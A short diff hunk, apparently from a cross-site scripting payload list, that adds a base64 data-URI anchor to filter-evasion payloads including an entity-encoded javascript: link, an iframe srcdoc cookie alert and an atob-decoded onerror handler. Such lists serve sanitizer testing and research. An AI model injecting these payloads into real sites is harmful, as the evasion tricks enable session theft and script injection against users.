@@ -6,3 +6,4 @@
 <a href="&#X6A;avascript:alert(1)">XSS</a>
 <iframe srcdoc="<script>alert(document.cookie)</script>"></iframe>
 <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">Clickme</a>
